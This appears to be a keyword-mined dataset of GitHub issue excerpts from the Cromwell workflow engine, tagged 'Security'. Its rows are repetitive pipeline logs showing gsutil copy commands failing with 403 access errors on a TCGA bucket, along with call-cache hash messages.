/mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list,; command failed: AccessDeniedException: 403 Caller does not have; storage.objects.list access to bucket firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred. 2017/02/07 15:45:16 I: Running command: sudo gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; 2017/02/07 15:45:17 E: command ",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974:11493,access,access,11493,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974,1,['access'],['access']
Security,"_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list,; command failed: AccessDeniedException: 403 Caller does not have; storage.objects.list access to bucket firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred. 2017/02/07 15:45:16 I: Running command: sudo gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; 2017/02/07 15:45:17 E: command failed: AccessDeniedException: 403; Caller does not have storage.objects.list access to bucket; firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred.; (exit status 1); 2017/02/07 15:45:17 W: cp failed: gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list,; command failed: AccessDeniedException: 403 Caller does not have; storage.objects.list access to bucket firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred. 2017/02/07 15:45:47 I: Running command: sudo gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; 2017/02/07 15:45:48 E: command ",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974:12747,access,access,12747,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974,1,['access'],['access']
Security,"_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list,; command failed: AccessDeniedException: 403 Caller does not have; storage.objects.list access to bucket firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred. 2017/02/07 15:45:47 I: Running command: sudo gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; 2017/02/07 15:45:48 E: command failed: AccessDeniedException: 403; Caller does not have storage.objects.list access to bucket; firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred.; (exit status 1); 2017/02/07 15:45:48 W: cp failed: gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list,; command failed: AccessDeniedException: 403 Caller does not have; storage.objects.list access to bucket firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred. 2017/02/07 15:45:48 I: Copying /var/log/google-genomics/*.log to; gs://broad-dsde-methods/lichtens/cromwell-executions-test_dl_oxoq/bamsurgeon_workflow/f6f01c57-23e2-4d29-854a-0d39c11ff950/call-generate_true_positives/; 2017/02/07 15:45:48 I: Running command: sudo gsutil -h; Content-type:text/plain -q -m cp /var/log/google-genomics/*.log; gs://broad-dsde-methods/lichtens/cromwell-executions-test_dl_oxoq/bamsurgeon_workflow/f6f01c57-23e2-4d29-854a-0",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974:14001,access,access,14001,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974,1,['access'],['access']
Security,"_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; 2017/02/07 15:41:49 I: Running command: sudo gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; 2017/02/07 15:41:50 E: command failed: AccessDeniedException: 403; Caller does not have storage.objects.list access to bucket; firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred.; (exit status 1); 2017/02/07 15:41:50 W: cp failed: gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list,; command failed: AccessDeniedException: 403 Caller does not have; storage.objects.list access to bucket firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred. 2017/02/07 15:41:59 I: Running command: sudo gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; 2017/02/07 15:42:00 E: command failed: AccessDeniedException: 403; Caller does not have storage.objects.list access to bucket; firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred.; (exit status 1); 2017/0",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974:2900,access,access,2900,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974,1,['access'],['access']
Security,"_assoc:-1:1-20000000023 [b303ae23expanse_figures.CBL_hom_SNP_assoc:NA:1]: Unrecognized runtime attribute keys: shortTask, dx_timeout; [2023-03-29 12:35:42,07] [info] BT-322 b303ae23:expanse_figures.CBL_hom_SNP_assoc:-1:1 cache hit copying success with aggregated hashes: initial = B4BFDDD19BC42B30ED73AB035F6BF1DE, file = 93DAD89F707FA490E2A46FFAC924DFFF.; [2023-03-29 12:35:42,07] [info] b303ae23-e1e5-4cde-832b-70114e9efdad-EngineJobExecutionActor-expanse_figures.CBL_hom_SNP_assoc:NA:1 [b303ae23]: Call cache hit process had 0 total hit failures before completing successfully; [2023-03-29 12:35:42,08] [warn] b303ae23-e1e5-4cde-832b-70114e9efdad-BackendCacheHitCopyingActor-b303ae23:expanse_figures.CBL_hom_not_SNP_assoc:-1:1-20000000024 [b303ae23expanse_figures.CBL_hom_not_SNP_assoc:NA:1]: Unrecognized runtime attribute keys: shortTask, dx_timeout; [2023-03-29 12:35:42,08] [info] BT-322 b303ae23:expanse_figures.CBL_hom_not_SNP_assoc:-1:1 cache hit copying success with aggregated hashes: initial = B4BFDDD19BC42B30ED73AB035F6BF1DE, file = EA2DED52B795D0B2EA5091B00E8F7A88.; [2023-03-29 12:35:42,08] [info] b303ae23-e1e5-4cde-832b-70114e9efdad-EngineJobExecutionActor-expanse_figures.CBL_hom_not_SNP_assoc:NA:1 [b303ae23]: Call cache hit process had 0 total hit failures before completing successfully; [2023-03-29 12:35:42,13] [warn] b303ae23-e1e5-4cde-832b-70114e9efdad-BackendCacheHitCopyingActor-b303ae23:expanse_figures.CBL_assoc:-1:1-20000000025 [b303ae23expanse_figures.CBL_assoc:NA:1]: Unrecognized runtime attribute keys: shortTask, dx_timeout; [2023-03-29 13:07:47,67] [info] BT-322 58e64982:expanse_figures.CBL_assoc:-1:1 cache hit copying success with aggregated hashes: initial = B4BFDDD19BC42B30ED73AB035F6BF1DE, file = C3078AB9F63DD3A59655953B1975D6CF.; [2023-03-29 13:07:47,67] [info] 58e64982-cf3d-4e77-ad72-acfda8299d1b-EngineJobExecutionActor-expanse_figures.CBL_assoc:NA:1 [58e64982]: Call cache hit process had 0 total hit failures before completing successfully; ```. Can",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7108:1725,hash,hashes,1725,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7108,1,['hash'],['hashes']
Security,"_brits_sample_list:-1:1-20000000013 [788d8048main.white_brits_sample_list:NA:1]: Unrecognized runtime attribute keys:; shortTask, dx_timeout; [2022-12-15 21:28:04,01] [warn] 788d8048-ef2b-4d7c-b3cb-6e04b3cbbdc2-BackendCacheHitCopyingActor-788d8048:main.low_genotyping_quality_sample_list:-1:1-20000000014 [788d8048main.low_genotyping_quality_sample_list:NA:1]: Unrecognized ru; ntime attribute keys: shortTask, dx_timeout; [2022-12-15 21:28:04,01] [info] BT-322 788d8048:main.white_brits_sample_list:-1:1 cache hit copying success with aggregated hashes: initial = B2C071CED641A1EB183DE4A4655F45ED, file = 9675960412B5394D5D0816ED198FB6EB.; [2022-12-15 21:28:04,01] [info] 788d8048-ef2b-4d7c-b3cb-6e04b3cbbdc2-EngineJobExecutionActor-main.white_brits_sample_list:NA:1 [788d8048]: Call cache hit process had 0 total hit failures before completing successfully; [2022-12-15 21:28:04,01] [info] BT-322 788d8048:main.low_genotyping_quality_sample_list:-1:1 cache hit copying success with aggregated hashes: initial = 3C891C9939496580DDF747805F991E06, file = AAFFF98AC7D58B07E7CE25978A906B00.; [2022-12-15 21:28:04,01] [info] 788d8048-ef2b-4d7c-b3cb-6e04b3cbbdc2-EngineJobExecutionActor-main.low_genotyping_quality_sample_list:NA:1 [788d8048]: Call cache hit process had 0 total hit failures before completing successfully; [2022-12-15 21:28:04,02] [warn] 788d8048-ef2b-4d7c-b3cb-6e04b3cbbdc2-BackendCacheHitCopyingActor-788d8048:main.sex_mismatch_sample_list:-1:1-20000000015 [788d8048main.sex_mismatch_sample_list:NA:1]: Unrecognized runtime attribute keys; : shortTask, dx_timeout; [2022-12-15 21:28:04,02] [info] BT-322 788d8048:main.sex_mismatch_sample_list:-1:1 cache hit copying success with aggregated hashes: initial = 03340ED60152B24B7D0988669F47CF2B, file = EB6A9909BDF3705B7BB543E4096DA08A.; [2022-12-15 21:28:04,02] [info] 788d8048-ef2b-4d7c-b3cb-6e04b3cbbdc2-EngineJobExecutionActor-main.sex_mismatch_sample_list:NA:1 [788d8048]: Call cache hit process had 0 total hit failures before comple",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6971:36225,hash,hashes,36225,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6971,1,['hash'],['hashes']
Security,"_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; 2017/02/07 15:41:50 E: command failed: AccessDeniedException: 403; Caller does not have storage.objects.list access to bucket; firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred.; (exit status 1); 2017/02/07 15:41:50 W: cp failed: gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list,; command failed: AccessDeniedException: 403 Caller does not have; storage.objects.list access to bucket firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred. 2017/02/07 15:41:59 I: Running command: sudo gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; 2017/02/07 15:42:00 E: command failed: AccessDeniedException: 403; Caller does not have storage.objects.list access to bucket; firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred.; (exit status 1); 2017/02/07 15:42:00 W: cp failed: gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-ac",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974:3136,access,access,3136,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974,2,['access'],['access']
Security,"_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; 2017/02/07 15:42:00 E: command failed: AccessDeniedException: 403; Caller does not have storage.objects.list access to bucket; firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred.; (exit status 1); 2017/02/07 15:42:00 W: cp failed: gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list,; command failed: AccessDeniedException: 403 Caller does not have; storage.objects.list access to bucket firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred. 2017/02/07 15:42:16 I: Running command: sudo gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; 2017/02/07 15:42:17 E: command failed: AccessDeniedException: 403; Caller does not have storage.objects.list access to bucket; firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred.; (exit status 1); 2017/02/07 15:42:17 W: cp failed: gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-ac",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974:4390,access,access,4390,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974,2,['access'],['access']
Security,"_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; 2017/02/07 15:42:17 E: command failed: AccessDeniedException: 403; Caller does not have storage.objects.list access to bucket; firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred.; (exit status 1); 2017/02/07 15:42:17 W: cp failed: gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list,; command failed: AccessDeniedException: 403 Caller does not have; storage.objects.list access to bucket firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred. 2017/02/07 15:42:40 I: Running command: sudo gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; 2017/02/07 15:42:41 E: command failed: AccessDeniedException: 403; Caller does not have storage.objects.list access to bucket; firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred.; (exit status 1); 2017/02/07 15:42:41 W: cp failed: gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-ac",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974:5644,access,access,5644,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974,2,['access'],['access']
Security,"_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; 2017/02/07 15:42:41 E: command failed: AccessDeniedException: 403; Caller does not have storage.objects.list access to bucket; firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred.; (exit status 1); 2017/02/07 15:42:41 W: cp failed: gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list,; command failed: AccessDeniedException: 403 Caller does not have; storage.objects.list access to bucket firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred. 2017/02/07 15:43:11 I: Running command: sudo gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; 2017/02/07 15:43:12 E: command failed: AccessDeniedException: 403; Caller does not have storage.objects.list access to bucket; firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred.; (exit status 1); 2017/02/07 15:43:12 W: cp failed: gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-ac",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974:6898,access,access,6898,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974,2,['access'],['access']
Security,"_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; 2017/02/07 15:43:12 E: command failed: AccessDeniedException: 403; Caller does not have storage.objects.list access to bucket; firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred.; (exit status 1); 2017/02/07 15:43:12 W: cp failed: gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list,; command failed: AccessDeniedException: 403 Caller does not have; storage.objects.list access to bucket firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred. 2017/02/07 15:43:42 I: Running command: sudo gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; 2017/02/07 15:43:43 E: command failed: AccessDeniedException: 403; Caller does not have storage.objects.list access to bucket; firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred.; (exit status 1); 2017/02/07 15:43:43 W: cp failed: gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-ac",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974:8152,access,access,8152,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974,2,['access'],['access']
Security,"_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; 2017/02/07 15:43:43 E: command failed: AccessDeniedException: 403; Caller does not have storage.objects.list access to bucket; firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred.; (exit status 1); 2017/02/07 15:43:43 W: cp failed: gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list,; command failed: AccessDeniedException: 403 Caller does not have; storage.objects.list access to bucket firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred. 2017/02/07 15:44:13 I: Running command: sudo gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; 2017/02/07 15:44:14 E: command failed: AccessDeniedException: 403; Caller does not have storage.objects.list access to bucket; firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred.; (exit status 1); 2017/02/07 15:44:14 W: cp failed: gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-ac",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974:9406,access,access,9406,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974,2,['access'],['access']
Security,"_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; 2017/02/07 15:44:14 E: command failed: AccessDeniedException: 403; Caller does not have storage.objects.list access to bucket; firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred.; (exit status 1); 2017/02/07 15:44:14 W: cp failed: gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list,; command failed: AccessDeniedException: 403 Caller does not have; storage.objects.list access to bucket firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred. 2017/02/07 15:44:44 I: Running command: sudo gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; 2017/02/07 15:44:46 E: command failed: AccessDeniedException: 403; Caller does not have storage.objects.list access to bucket; firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred.; (exit status 1); 2017/02/07 15:44:46 W: cp failed: gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-ac",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974:10660,access,access,10660,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974,2,['access'],['access']
Security,"_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; 2017/02/07 15:44:46 E: command failed: AccessDeniedException: 403; Caller does not have storage.objects.list access to bucket; firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred.; (exit status 1); 2017/02/07 15:44:46 W: cp failed: gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list,; command failed: AccessDeniedException: 403 Caller does not have; storage.objects.list access to bucket firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred. 2017/02/07 15:45:16 I: Running command: sudo gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; 2017/02/07 15:45:17 E: command failed: AccessDeniedException: 403; Caller does not have storage.objects.list access to bucket; firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred.; (exit status 1); 2017/02/07 15:45:17 W: cp failed: gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; 